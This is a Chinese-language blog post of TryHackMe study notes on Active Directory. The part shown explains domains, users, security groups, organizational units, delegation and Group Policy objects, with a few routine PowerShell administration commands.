<!doctype html>
<html lang="zh"><head>
<title>Try Hack Me - Active Directory - Recopec 的博客</title>
<meta charset="UTF-8">
<meta name="keywords" content="">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
<meta name="description" content="概述这是我在 TryHackMe 里面学习 Windows Active Directory 相关渗透技巧的记录，推荐当做一个官方之外的 WriteUp 来阅读，直接阅读你会看不懂的。说实话各个房间设计的都挺巧妙的，虽然也有很多 Bug，不过利用搜索引擎和官方的 Discord 群组能解决。 这一部分我耗时一个星期完成，大多都是我的学习记录和理解，希望里面的内容能帮到你们。 Active Dire">
<meta property="og:type" content="article">
<meta property="og:title" content="Try Hack Me - Active Directory">
<meta property="og:url" content="https://blog.irec.moe/thm_ad.html">
<meta property="og:site_name" content="Recopec 的博客">
<meta property="og:description" content="概述这是我在 TryHackMe 里面学习 Windows Active Directory 相关渗透技巧的记录，推荐当做一个官方之外的 WriteUp 来阅读，直接阅读你会看不懂的。说实话各个房间设计的都挺巧妙的，虽然也有很多 Bug，不过利用搜索引擎和官方的 Discord 群组能解决。 这一部分我耗时一个星期完成，大多都是我的学习记录和理解，希望里面的内容能帮到你们。 Active Dire">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/bebe5dfec0208bf563d01fa2dd1fb7a7.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/d82cb9440894c831f6f3d58a2b0538ed.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/06d5e70fbfa648f73e4598e18c8e9527.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/c9293853549d5126b77bf2de8086e076.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/2eab5cacbd0d3e9dc9afb86169b711ec.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/abea24b7979676a1dcc0c568054544c8.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/03448c2faf976db890118d835000bab7.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/af95eb1a4b6c672491d8989f79c00200.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250802133134659.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/855d6fa3ea4076164934a2ba9717ffb5.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0db01f1f1434f33fa8fb11de2bd165a6.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250805011844795.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250805212143831.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250805213606577.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250805215149176.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250805220109218.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250807052300452.png">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250807215110026.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250807215259716.png">
<meta property="og:image" content="https://blog.irec.moe/thm_ad/image-20250807220033428.png">
<meta property="article:published_time" content="2025-08-09T16:00:00.000Z">
<meta property="article:modified_time" content="2025-08-09T16:51:50.000Z">
<meta property="article:author" content="Recopec">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Active Directory">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog.irec.moe/thm_ad/bebe5dfec0208bf563d01fa2dd1fb7a7.png">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1758806527402">

<link rel="stylesheet" href="/css/style.css?v=1758806527402">






<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1758806527402"></script>

 



<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Recopec 的博客" type="application/atom+xml">
</head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/bg.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="Recopec"><img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Recopec">
            <img src="https://cdn.jsdelivr.net/gh/Recopec/Recopec.github.io@latest/images/avatar.jpg" alt="Recopec" alt="Recopec">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>25</div>
        <div><span>标签</span>34</div>
        <div><span>分类</span>6</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:irec.moe" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>




    
        
        <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://space.bilibili.com/8209358"
			target="_blank"
			mdui-tooltip="{content: '哔哩哔哩'}"
			style="
				color: rgb(231, 106, 141);
				background-color: rgba(231, 106, 141, .1);
			"
		>
			<i
				class="nexmoefont icon-bilibili"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://github.com/Recopec/"
			target="_blank"
			mdui-tooltip="{content: 'GitHub'}"
			style="
				color: rgb(25, 23, 23);
				background-color: rgba(25, 23, 23, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://twitter.com/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'Twitter'}"
			style="
				color: rgb(59, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-twitter"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://t.me/Recopec"
			target="_blank"
			mdui-tooltip="{content: 'TG'}"
			style="
				color: rgb(70, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-telegram"
			></i> </a
		>
	</div>
</div>

    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/THM/">THM</a>
          <span class="category-list-count">6</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/学习/">学习</a>
          <span class="category-list-count">3</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/无线电/">无线电</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/生活/">生活</a>
          <span class="category-list-count">2</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/硬件/">硬件</a>
          <span class="category-list-count">8</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/网络/">网络</a>
          <span class="category-list-count">4</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Active-Directory/" style="font-size: 10px;">Active Directory</a> <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C#</a> <a href="/tags/OpenClash/" style="font-size: 10px;">OpenClash</a> <a href="/tags/OpenVPN/" style="font-size: 10px;">OpenVPN</a> <a href="/tags/OpenWrt/" style="font-size: 10px;">OpenWrt</a> <a href="/tags/PC/" style="font-size: 10px;">PC</a> <a href="/tags/VR/" style="font-size: 10px;">VR</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/WireGuard/" style="font-size: 10px;">WireGuard</a> <a href="/tags/WireShark/" style="font-size: 10px;">WireShark</a> <a href="/tags/%E4%BF%9D%E5%81%A5/" style="font-size: 10px;">保健</a> <a href="/tags/%E5%85%89%E7%8C%AB/" style="font-size: 15px;">光猫</a> <a href="/tags/%E5%8D%87%E5%AD%A6/" style="font-size: 10px;">升学</a> <a href="/tags/%E5%8D%AB%E6%98%9F/" style="font-size: 10px;">卫星</a> <a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 10px;">抓包</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 15px;">数据库</a> <a href="/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/" style="font-size: 10px;">无线电</a> <a href="/tags/%E6%9C%BA%E5%9C%BA/" style="font-size: 10px;">机场</a> <a href="/tags/%E6%A0%88/" style="font-size: 10px;">栈</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E7%81%B5%E8%BD%A6/" style="font-size: 10px;">灵车</a> <a href="/tags/%E7%94%B5%E6%B1%A0/" style="font-size: 10px;">电池</a> <a href="/tags/%E7%9F%AD%E6%B3%A2/" style="font-size: 10px;">短波</a> <a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 10px;">硬盘</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 15px;">笔记</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 10px;">经验</a> <a href="/tags/%E7%BB%AD%E5%91%BD/" style="font-size: 10px;">续命</a> <a href="/tags/%E7%BD%91%E5%8D%A1/" style="font-size: 10px;">网卡</a> <a href="/tags/%E7%BE%8A%E6%AF%9B/" style="font-size: 10px;">羊毛</a> <a href="/tags/%E7%BE%A4%E6%99%96/" style="font-size: 15px;">群晖</a> <a href="/tags/%E8%80%83%E8%AF%95/" style="font-size: 10px;">考试</a> <a href="/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/" style="font-size: 10px;">银行卡</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(34);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    一言
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.addEventListener('load', function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  })
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章归档</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">3</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">最新文章</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/thm_openvpn_conf.html">TryHackMe OpenVPN 配置优化指北</a>
          </li>
        
          <li>
            <a href="/android_capture.html">Android 抓包配置 (Charles + Burp)</a>
          </li>
        
          <li>
            <a href="/thm_rthe.html">Try Hack Me - Red Teaming</a>
          </li>
        
          <li>
            <a href="/thm_ad.html">Try Hack Me - Active Directory</a>
          </li>
        
          <li>
            <a href="/thm_wap.html">Try Hack Me - Web Application Pentesting</a>
          </li>
        
      </ul>
    </div>
  </div>

    
        
   
    <div class="nexmoe-copyright">
        &copy; 2025 Recopec
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
            <img src="/thm_ad/cover.jpg" alt="Try Hack Me - Active Directory" loading="lazy">
            <h1>Try Hack Me - Active Directory</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2025年08月10日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/THM/">THM</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约38.1k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要149分钟</a>

    </div>
    
    
    
    
    
</div>

    <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这是我在 <a target="_blank" rel="noopener" href="https://tryhackme.com/">TryHackMe</a> 里面学习 Windows Active Directory 相关渗透技巧的记录，推荐当做一个官方之外的 WriteUp 来阅读，直接阅读你会看不懂的。说实话各个房间设计的都挺巧妙的，虽然也有很多 Bug，不过利用搜索引擎和官方的 Discord 群组能解决。</p>
<p>这一部分我耗时一个星期完成，大多都是我的学习记录和理解，希望里面的内容能帮到你们。</p>
<h1 id="Active-Directory-Basics"><a href="#Active-Directory-Basics" class="headerlink" title="Active Directory Basics"></a>Active Directory Basics</h1><p>这个房间主要是讲了一下 AD 的基础，还有实操了一下 GPO</p>
<h2 id="Windows-域"><a href="#Windows-域" class="headerlink" title="Windows 域"></a>Windows 域</h2><p><strong>Windows 域</strong>是受特定企业管理的一组用户和计算机。域的主要理念是将 Windows 计算机网络的常用组件集中管理到一个名为Active Directory ( AD )的存储库中。运行 Active Directory 服务的服务器称为<strong>域控制器 ( DC )</strong>。</p>
<img src="/thm_ad/bebe5dfec0208bf563d01fa2dd1fb7a7.png" class="" title="Windows 域概述">

<p>配置 Windows 域的主要优点是：</p>
<ul>
<li>**集中身份管理：**可以轻松从 Active Directory 配置整个网络的所有用户。</li>
<li>**管理安全策略：**您可以直接从 Active Directory 配置安全策略，并根据需要将其应用于网络上的用户和计算机。</li>
</ul>
<h2 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h2><p>Windows 域的核心是 AD DS (Active Directory Domain Service)，这项服务就像一个目录，保存着网络上所有“对象”的信息。在 AD 支持的众多对象中，有用户、组、机器、打印机、共享等。让我们来看看其中的一些：</p>
<h3 id="Users-用户"><a href="#Users-用户" class="headerlink" title="Users 用户"></a>Users 用户</h3><p>用户是一种被称为安全主体的对象。<strong>安全主体</strong>是一个通用的概念，它指的是任何可以被域认证身份（如通过密码），并被<strong>授予权限</strong>来访问和操作网络中各种资源（如文件、打印机）的实体。</p>
<p>用户可用于代表两类实体：</p>
<ul>
<li>People：用户通常代表组织中需要访问网络的人员，如员工。</li>
<li>Service：您也可以定义用户供 <code>IIS</code> 或 <code>MSSQL</code> 等服务使用。每个服务都需要用户才能运行，但服务用户与普通用户不同，他们只拥有运行特定服务所需的权限。</li>
</ul>
<h3 id="Machines-机器"><a href="#Machines-机器" class="headerlink" title="Machines 机器"></a>Machines 机器</h3><p>机器是 Active Directory 中的另一种对象类型；每台加入 Active Directory 域的计算机都会创建一个机器对象。机器也被视为安全主体，与普通用户一样被分配一个账户。该账户在域内的权限有限。</p>
<p>机器账户本身是指定计算机上的本地管理员，除了计算机本身外，一般不允许任何人访问，但与其他账户一样，如果你有密码，就可以用它登录。</p>
<p>机器账户的密码会被自动轮换，它由120个随机字符串组成，机器账户是由机器名后加一个 $ 符号组成，比如 <code>DC01</code> 机器会有一个 <code>DC01$</code> 账户。</p>
<h3 id="Security-Groups-安全组"><a href="#Security-Groups-安全组" class="headerlink" title="Security Groups 安全组"></a>Security Groups 安全组</h3><p>如果你熟悉 Windows，你可能知道可以定义用户组，将文件或其他资源的访问权限分配给整个组，而不是单个用户。这样可以更好地进行管理，因为你可以将用户添加到现有组中，他们将自动继承该组的所有权限。安全组也被视为安全负责人，因此可以拥有对网络资源的权限。</p>
<p>组的成员既可以是用户，也可以是机器。如果需要，组还可以包括其他组。</p>
<p>域中默认创建了几个组，可用于向用户授予特定权限。下面举例说明域中最重要的几个组：</p>
<table>
<thead>
<tr>
<th><strong>Security Group</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Domain Admins</td>
<td>该组的用户拥有整个域的管理权限。默认情况下，他们可以管理域上的任何计算机，包括 DC。</td>
</tr>
<tr>
<td>Server Operators</td>
<td>该组中的用户可以管理域控制器。他们不能更改任何管理组的成员资格。</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>该组的用户可以访问任何文件，无需考虑其权限。它们用于执行计算机数据备份。</td>
</tr>
<tr>
<td>Account Operators</td>
<td>该组中的用户可以创建或修改域中的其他账户。</td>
</tr>
<tr>
<td>Domain Users</td>
<td>Includes all existing user accounts in the domain.</td>
</tr>
<tr>
<td>Domain Computers</td>
<td>Includes all existing computers in the domain.</td>
</tr>
<tr>
<td>Domain Controllers</td>
<td>Includes all existing DCs on the domain.</td>
</tr>
</tbody></table>
<p>关于默认安全组的微软文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups</a></p>
<h3 id="Organizational-Units-管理单元"><a href="#Organizational-Units-管理单元" class="headerlink" title="Organizational Units 管理单元"></a>Organizational Units 管理单元</h3><p>要在 Active Directory 中配置用户、组或机器，我们需要登录域控制器，并从开始菜单中运行 “Active Directory Users and Computers”：</p>
<p>这将打开一个窗口，你可以看到域中存在的用户、计算机和组的层次结构。这些对象按组织单位 (Organizational Units OU) 组织，组织单位是一种容器对象，可以对用户和计算机进行分类。OUs 主要用于定义具有类似监控要求的用户集合。请记住，一个用户在同一时间只能属于一个 OU。</p>
<p>Windows 自动创建的 OU，包含以下内容：</p>
<ul>
<li>Builtin： 包含任何 Windows 主机都可使用的默认组。</li>
<li>Computers： 任何加入网络的机器都会默认放在这里。如有需要，您可以移动它们。</li>
<li>Domain Controllers： 包含网络中 DC 的默认 OU。</li>
<li>Users： 适用于全域范围的默认用户和组。</li>
<li>Managed Service Accounts： 保存 Windows 域中服务使用的账户。</li>
</ul>
<h3 id="Security-Groups-vs-OUs"><a href="#Security-Groups-vs-OUs" class="headerlink" title="Security Groups vs OUs"></a>Security Groups vs OUs</h3><p>你可能想知道为什么我们既有组又有 OU。虽然两者都用于对用户和计算机进行分类，但它们的目的完全不同：</p>
<ul>
<li>OU 可以方便地将策略应用到用户和计算机，其中包括根据用户在企业中的特定角色对其进行特定配置。请记住，一个用户在同一时间只能是一个 OU 的成员，因为试图对一个用户应用两套不同的策略是没有意义的。</li>
<li>另一方面，安全组用于授予资源权限。例如，如果要允许某些用户访问共享文件夹或网络打印机，就需要使用组。<strong>一个</strong>用户可以是<strong>多个</strong>组的成员，这是对多个资源授予访问权限所必需的。</li>
</ul>
<h2 id="管理-AD"><a href="#管理-AD" class="headerlink" title="管理 AD"></a>管理 AD</h2><h3 id="删除额外的-OU-和用户"><a href="#删除额外的-OU-和用户" class="headerlink" title="删除额外的 OU 和用户"></a>删除额外的 OU 和用户</h3><p>需要关闭 Advanced Features -&gt; Object -&gt; Protect object from accidental deletion</p>
<h3 id="委派-Delegation"><a href="#委派-Delegation" class="headerlink" title="委派 Delegation"></a>委派 Delegation</h3><p>在 AD 中可以做的一件好事就是让特定用户对某些 OU 享有一定的控制权。这个过程被称为委派，允许你授予用户在 OU 上执行高级任务的特定权限，而不需要域管理员介入。最常见的使用案例之一就是授予 IT 支持人员重置其他低权限用户密码的权限。</p>
<p>给 OU 委派，右键选择 Delegate Control -&gt; Add -&gt; Check Names -&gt; 选择要委派的权限。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 重置密码</span></span>
<span class="line"><span style="color: #56B6C2">Set-ADAccountPassword</span><span style="color: #ABB2BF"> sophie </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Reset </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NewPassword (</span><span style="color: #56B6C2">Read-Host</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsSecureString </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Prompt </span><span style="color: #98C379">&#39;New Password&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Verbose</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 强制用户在登录时改密码</span></span>
<span class="line"><span style="color: #56B6C2">Set-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ChangePasswordAtLogon </span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity sophie </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Verbose</span></span></code></pre></div></div></figure>

<h3 id="管理计算机"><a href="#管理计算机" class="headerlink" title="管理计算机"></a>管理计算机</h3><p>默认情况下，所有加入域的计算机（DC 除外）都会被放入名为“Computers”的容器中。</p>
<p>我们可以看到一些服务器、一些笔记本电脑和一些 PC，它们分别对应着我们网络中的用户。将所有设备都放在那里并不是最好的选择，因为您很可能希望针对服务器和普通用户日常使用的机器设置不同的策略。</p>
<p>虽然没有关于如何组织你的机器的黄金法则，但一个很好的起点是根据设备的用途进行分类。通常，你会看到设备至少分为以下三类：</p>
<p><strong>1.工作站</strong></p>
<p>工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录到工作站。他们将使用该设备进行工作或进行正常的浏览活动。这些设备绝对不应该有特权用户登录。</p>
<p><strong>2. 服务器</strong></p>
<p>服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。</p>
<p><strong>3. 域控制器</strong></p>
<p>域控制器是 Active Directory 域中第三常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p>
<h2 id="Group-Policies-组策略"><a href="#Group-Policies-组策略" class="headerlink" title="Group Policies 组策略"></a>Group Policies 组策略</h2><p>到目前为止，我们只是为了方便而将用户和计算机组织到 OU 中，但这背后的主要想法是能够为每个 OU 单独部署不同的策略。这样，我们就可以根据用户所在的部门向其推送不同的配置和安全基线。</p>
<p>Windows 通过组策略对象（GPO）来管理此类策略。GPO 只是一组可应用于 OU 的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定的机器和身份设置基线。</p>
<p>要配置 GPO，可以使用 “开始 ”菜单中的 “组策略管理 ”工具：</p>
<p>打开它后，首先看到的是之前定义的完整 OU 层次结构。要配置组策略，首先要在组策略对象下创建一个 GPO，然后将其链接到要应用策略的 OU。举例来说，你可以看到机器中已经存在一些 GPO：</p>
<img src="/thm_ad/d82cb9440894c831f6f3d58a2b0538ed.png" class="" title="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;d82cb9440894c831f6f3d58a2b0538ed.png">

<p>可以在 Group Policy Objects 里面看到创建的 GPO，然后对应的链接到 GPO 的地方是有一个快捷方式一样的小图标。</p>
<p>让我们检查一下 “默认域策略”，看看 GPO 内部有什么。选择 GPO 时看到的第一个选项卡会显示其范围，即 GPO 在 AD 中的链接位置。对于当前策略，我们可以看到它只链接到了 thm.local 域：</p>
<img src="/thm_ad/06d5e70fbfa648f73e4598e18c8e9527.png" class="" title="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;06d5e70fbfa648f73e4598e18c8e9527.png">

<p>如您所见，您还可以对 GPO 应用安全过滤，使其只应用于 OU 下的特定用户&#x2F;计算机。默认情况下，它们将应用于 “已验证用户 ”组，其中包括所有用户&#x2F;计算机。</p>
<p>设置选项卡包括 GPO 的实际内容，让我们知道它适用于哪些特定配置。如前所述，每个 GPO 都有只适用于计算机的配置和只适用于用户的配置。在本例中，默认域策略只包含计算机配置：</p>
<img src="/thm_ad/c9293853549d5126b77bf2de8086e076.png" class="" title="OU Settings">

<p>后面就是进 GPO 编辑器改了，跟我们 <code>gpedit.msc</code> 一样的，不过这个会应用到应用了 GPO 的 OU 上。但是 GPO 不能直接应用在组上，但可以通过<strong>安全筛选</strong>来让它只对某个组生效。</p>
<h3 id="分发-GPO"><a href="#分发-GPO" class="headerlink" title="分发 GPO"></a>分发 GPO</h3><p>GPO 通过名为 SYSVOL 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都可以通过网络访问该共享，以定期同步他们的 GPO。SYSVOL 共享默认指向网络中每个 DC 上的 C:\Windows\SYSVOL\sysvol\ 目录。</p>
<p>一旦对任何 GPO 进行了更改，计算机可能需要长达 2 个小时的时间才能跟上。如果要强制任何特定计算机立即同步其 GPO，可以在所需计算机上运行以下命令：</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">gpupdate /force</span></span></code></pre></div></div></figure>

